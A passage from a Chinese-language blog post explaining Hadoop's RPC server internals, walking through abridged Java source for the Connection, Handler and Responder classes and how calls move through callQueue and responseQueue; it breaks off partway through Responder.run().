<p>可以看到Reader做的就是不停地找它所管理的客户端连接中有数据可读的，然后找到这个连接对应的Connection对象，交由相应的connection来处理，于是目光就转向了Connection类。之前说过Connection类表示一个客户端已建立的连接，这个类有一个channel的引用，表示这个连接底层使用的channel(可以理解成socket)。其实Connection类的内容远不止这些，接下来就看看Connection类的代码。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Connection</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">SocketChannel</span> <span class="n">channel</span><span class="o">;</span> <span class="c1">// 这个连接底层的channel</span>
</span><span class='line'>    <span class="c1">// 对于客户端的每个rpc函数调用都会生成Call对象，responseQueue保存的是已经处理完的call</span>
</span><span class='line'>    <span class="c1">// call对象里有处理完后的结果，之后要传回给客户端的</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">LinkedList</span><span class="o">&lt;</span><span class="n">Call</span><span class="o">&gt;</span> <span class="n">responseQueue</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// number of outstanding rpcs 还没处理完的rpc请求，这里的处理完指的是将结果发回给客户端</span>
</span><span class='line'>    <span class="c1">// 客户端可能会一下子发送多个rpc请求，然后等待所有的结果</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kd">volatile</span> <span class="kt">int</span> <span class="n">rpcCount</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// readAndProcess()做的主要工作是读取一个rpc请求的所有数据</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">readAndProcess</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">InterruptedException</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>        <span class="n">processOneRpc</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">array</span><span class="o">());</span> <span class="c1">// data就是从channel中获得的一个rpc请求的所有数据</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">processOneRpc</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">buf</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">InterruptedException</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>        <span class="n">processData</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span>
</span><span class='line'>        <span class="c1">// omitted</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">processData</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">buf</span><span class="o">)</span> <span class="kd">throws</span>  <span class="n">IOException</span><span class="o">,</span> <span class="n">InterruptedException</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">DataInputStream</span> <span class="n">dis</span> <span class="o">=</span>
</span><span class='line'>        <span class="k">new</span> <span class="nf">DataInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">buf</span><span class="o">));</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">dis</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>                    <span class="c1">// try to read an id</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">Writable</span> <span class="n">param</span> <span class="o">=</span> <span class="n">ReflectionUtils</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">paramClass</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span><span class="c1">//read param</span>
</span><span class='line'>      <span class="n">param</span><span class="o">.</span><span class="na">readFields</span><span class="o">(</span><span class="n">dis</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">Call</span> <span class="n">call</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Call</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">param</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span><span class='line'>      <span class="n">callQueue</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">call</span><span class="o">);</span>              <span class="c1">// queue the call; maybe blocked here</span>
</span><span class='line'>      <span class="n">incRpcCount</span><span class="o">();</span>  <span class="c1">// Increment the rpc count</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>代码跟踪到这就差不多结束了，这些代码大致做了如下的事：首先是<code>readAndProcess()</code>读取一个rpc请求的所有数据，然后一直传到<code>processData()</code>函数处理，<code>processData()</code>函数首先把这些数据转成一个Call对象，这其实可以和上一节介绍的客户端向服务器发送rpc请求对应起来看，可以看作一个序列化和解序列化的过程。这个Call对象就包含了调用的函数名和函数参数，同时之前也提到过Call对象还会保存函数调用过后的结果即返回值。最后将Call对象放入callQueue队列中等待被处理。如果上面还记得Server的代码的话就可以发现callQueue实际上是Server的一个实例变量。我们讨论到现在的Listener，Reader，Connection类和之后要讨论的Handler，Responder都是这个Server的内部类，所以对这些类来说callQueue就相当于一个全局变量了。之前我们提到Listener会有多个Reader来读取很多客户端的rpc请求，所有这些请求被转化成Call对象后都会放入这个全局的callQueue队列中等待被处理。好了，至此Listener组件就全部讲完了，下面是Handler组件。</p>

<h3>Handler</h3>

<p>我们现在知道callQueue中包含了客户端对服务器的rpc调用请求，如何处理这些请求就是Handler的事了。看之前Server的源码我们可以知道Server中存在多个Handler，每个Handler都是一个线程，它们并发地从callQueue中取出一个一个的Call然后进行处理，下面来看看源代码。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java  */</span>
</span><span class='line'><span class="cm">/** Handles queued calls . */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">class</span> <span class="nc">Handler</span> <span class="kd">extends</span> <span class="n">Thread</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">ByteArrayOutputStream</span> <span class="n">buf</span> <span class="o">=</span>
</span><span class='line'>            <span class="k">new</span> <span class="nf">ByteArrayOutputStream</span><span class="o">(</span><span class="n">INITIAL_RESP_BUF_SIZE</span><span class="o">);</span>
</span><span class='line'>        <span class="k">while</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                <span class="kd">final</span> <span class="n">Call</span> <span class="n">call</span> <span class="o">=</span> <span class="n">callQueue</span><span class="o">.</span><span class="na">take</span><span class="o">();</span> <span class="c1">// pop the queue; maybe blocked here 从callQueue中取出一个call进行处理 </span>
</span><span class='line'>
</span><span class='line'>                <span class="n">Writable</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">CurCall</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">call</span><span class="o">);</span>
</span><span class='line'>                <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// Make the call as the user via Subject.doAs, thus associating</span>
</span><span class='line'>                    <span class="c1">// the call with the Subject</span>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">user</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">value</span> <span class="o">=</span> <span class="n">call</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">protocol</span><span class="o">,</span> <span class="n">call</span><span class="o">.</span><span class="na">param</span><span class="o">,</span> <span class="n">call</span><span class="o">.</span><span class="na">timestamp</span><span class="o">);</span> <span class="c1">// 处理这个call，也就是找到一个合适的对象调用客户端所要求的方法，并传入参数，最终获得结果</span>
</span><span class='line'>                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">value</span> <span class="o">=</span>
</span><span class='line'>                            <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">user</span><span class="o">.</span><span class="na">doAs</span>
</span><span class='line'>                            <span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedExceptionAction</span><span class="o">&lt;</span><span class="n">Writable</span><span class="o">&gt;()</span> <span class="o">{</span>
</span><span class='line'>                                 <span class="kd">public</span> <span class="n">Writable</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span><span class='line'>                                 <span class="c1">// make the call</span>
</span><span class='line'>                                 <span class="k">return</span> <span class="nf">call</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">protocol</span><span class="o">,</span> <span class="n">call</span><span class="o">.</span><span class="na">param</span><span class="o">,</span> <span class="n">call</span><span class="o">.</span><span class="na">timestamp</span><span class="o">);</span>
</span><span class='line'>                                 <span class="o">}</span>
</span><span class='line'>                             <span class="o">}</span>
</span><span class='line'>                            <span class="o">);</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// omitted</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>                <span class="n">CurCall</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
</span><span class='line'>                <span class="kd">synchronized</span> <span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// setupResponse() needs to be sync&#39;ed together with </span>
</span><span class='line'>                    <span class="c1">// responder.doResponse() since setupResponse may use</span>
</span><span class='line'>                    <span class="c1">// SASL to encrypt response data and SASL enforces</span>
</span><span class='line'>                    <span class="c1">// its own message ordering.</span>
</span><span class='line'>                    <span class="n">setupResponse</span><span class="o">(</span><span class="n">buf</span><span class="o">,</span> <span class="n">call</span><span class="o">,</span>
</span><span class='line'>                            <span class="o">(</span><span class="n">error</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="n">Status</span><span class="o">.</span><span class="na">SUCCESS</span> <span class="o">:</span> <span class="n">Status</span><span class="o">.</span><span class="na">ERROR</span><span class="o">,</span>
</span><span class='line'>                            <span class="n">value</span><span class="o">,</span> <span class="n">errorClass</span><span class="o">,</span> <span class="n">error</span><span class="o">);</span> <span class="c1">// 设置好返回值，也就是说把返回值等信息保存到call对象里。还记得吗，call对象能保存这个call的执行结果</span>
</span><span class='line'>                    <span class="c1">// Discard the large buf and reset it back to </span>
</span><span class='line'>                    <span class="c1">// smaller size to freeup heap</span>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">buf</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">maxRespSize</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                      <span class="n">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">(</span><span class="n">INITIAL_RESP_BUF_SIZE</span><span class="o">);</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                    <span class="n">responder</span><span class="o">.</span><span class="na">doRespond</span><span class="o">(</span><span class="n">call</span><span class="o">);</span> <span class="c1">// 处理返回结果</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>                          <span class="c1">// unexpected -- log it</span>
</span><span class='line'>                    <span class="c1">// omitted</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">// omitted</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到每个Handler线程做的就是从callQueue中取一个call，然后调用Server的call方法处理并获得结果，我们之前提到过这个call方法是抽象方法由具体的子类来实现，这个具体实现的子类我们之前也提到过在RPC.java文件中，具体的代码就不列出来了，只说一下它做了什么。具体call方法做的就是利用反射调用NameNode类的具体方法，在这里就是调用了<code>mkdirs()</code>，大家可以看看是不是NameNode里就有这个方法。获得完函数调用的结果后就把它放入对应的call对象里，然后调用<code>responder.doRespond()</code>方法来处理，于是就引出了Responder这个第三大组件。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* Server.java */</span>
</span><span class='line'><span class="kd">private</span> <span class="kd">class</span> <span class="nc">Responder</span> <span class="kd">extends</span> <span class="n">Thread</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">Selector</span> <span class="n">writeSelector</span><span class="o">;</span> <span class="c1">// 和readSelector异曲同工</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">void</span> <span class="nf">doRespond</span><span class="o">(</span><span class="n">Call</span> <span class="n">call</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>        <span class="kd">synchronized</span> <span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="c1">// 将这个call放入其所属的connection(也就是请求这个call的客户端所表示的connection)的responseQueue中等待被处理</span>
</span><span class='line'>            <span class="c1">// responseQueue在之前的Connection的源代码中也有介绍，它和callQueue很类似，只不过一个是全局的，一个是每个Connection都会有一个</span>
</span><span class='line'>            <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">.</span><span class="na">addLast</span><span class="o">(</span><span class="n">call</span><span class="o">);</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">processResponse</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// processResponse()主要做的就是从responseQueue中取一个call，然后获得这个call的调用结果，还记得当时保存进去了吗</span>
</span><span class='line'>    <span class="c1">// 将调用结果传回到客户端，至此一个rpc请求调用圆满完成</span>
</span><span class='line'>    <span class="c1">// 这个函数可能会在两种情况下被调用：一种是在Handler线程中被调用，就像上面的代码所示，另一种就是在Responder线程中被调用，这个待会会见到</span>
</span><span class='line'>    <span class="c1">// inHandler区别是在哪种情况下被调用</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">processResponse</span><span class="o">(</span><span class="n">LinkedList</span><span class="o">&lt;</span><span class="n">Call</span><span class="o">&gt;</span> <span class="n">responseQueue</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">inHandler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>        <span class="kt">boolean</span> <span class="n">error</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span><span class='line'>        <span class="kt">boolean</span> <span class="n">done</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>       <span class="c1">// there is more data for this channel.</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">numElements</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>        <span class="n">Call</span> <span class="n">call</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>            <span class="kd">synchronized</span> <span class="o">(</span><span class="n">responseQueue</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="c1">// If there are no items for this channel, then we are done</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="n">numElements</span> <span class="o">=</span> <span class="n">responseQueue</span><span class="o">.</span><span class="na">size</span><span class="o">();</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(</span><span class="n">numElements</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">error</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>              <span class="c1">// no more data for this channel.</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="c1">// Extract the first call</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="n">call</span> <span class="o">=</span> <span class="n">responseQueue</span><span class="o">.</span><span class="na">removeFirst</span><span class="o">();</span>
</span><span class='line'>                <span class="n">SocketChannel</span> <span class="n">channel</span> <span class="o">=</span> <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">channel</span><span class="o">;</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="c1">// Send as much data as we can in the non-blocking fashion</span>
</span><span class='line'>                <span class="c1">//</span>
</span><span class='line'>                <span class="kt">int</span> <span class="n">numBytes</span> <span class="o">=</span> <span class="n">channelWrite</span><span class="o">(</span><span class="n">channel</span><span class="o">,</span> <span class="n">call</span><span class="o">.</span><span class="na">response</span><span class="o">);</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(</span><span class="n">numBytes</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(!</span><span class="n">call</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">hasRemaining</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">decRpcCount</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">numElements</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>    <span class="c1">// last call fully processes.</span>
</span><span class='line'>                        <span class="n">done</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>             <span class="c1">// no more data for this channel.</span>
</span><span class='line'>                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">done</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>            <span class="c1">// more calls pending to be sent.</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">//</span>
</span><span class='line'>                    <span class="c1">// If we were unable to write the entire response out, then </span>
</span><span class='line'>                    <span class="c1">// insert in Selector queue. </span>
</span><span class='line'>                    <span class="c1">//</span>
</span><span class='line'>                    <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">.</span><span class="na">addFirst</span><span class="o">(</span><span class="n">call</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>                    <span class="k">if</span> <span class="o">(</span><span class="n">inHandler</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="c1">// set the serve time when the response has to be sent later</span>
</span><span class='line'>                        <span class="n">call</span><span class="o">.</span><span class="na">timestamp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
</span><span class='line'>
</span><span class='line'>                        <span class="n">incPending</span><span class="o">();</span>
</span><span class='line'>                        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                            <span class="c1">// Wakeup the thread blocked on select, only then can the call </span>
</span><span class='line'>                            <span class="c1">// to channel.register() complete.</span>
</span><span class='line'>                            <span class="n">writeSelector</span><span class="o">.</span><span class="na">wakeup</span><span class="o">();</span>
</span><span class='line'>                            <span class="n">channel</span><span class="o">.</span><span class="na">register</span><span class="o">(</span><span class="n">writeSelector</span><span class="o">,</span> <span class="n">SelectionKey</span><span class="o">.</span><span class="na">OP_WRITE</span><span class="o">,</span> <span class="n">call</span><span class="o">);</span> <span class="c1">// 让Responder来管理这个channel</span>
</span><span class='line'>                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClosedChannelException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                            <span class="c1">//Its ok. channel might be closed else where.</span>
</span><span class='line'>                            <span class="n">done</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span><span class='line'>                        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'>                            <span class="n">decPending</span><span class="o">();</span>
</span><span class='line'>                        <span class="o">}</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>                <span class="n">error</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>              <span class="c1">// everything went off well</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">closeConnection</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">done</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">lastPurgeTime</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>   <span class="c1">// last check for old calls.</span>
</span><span class='line'>
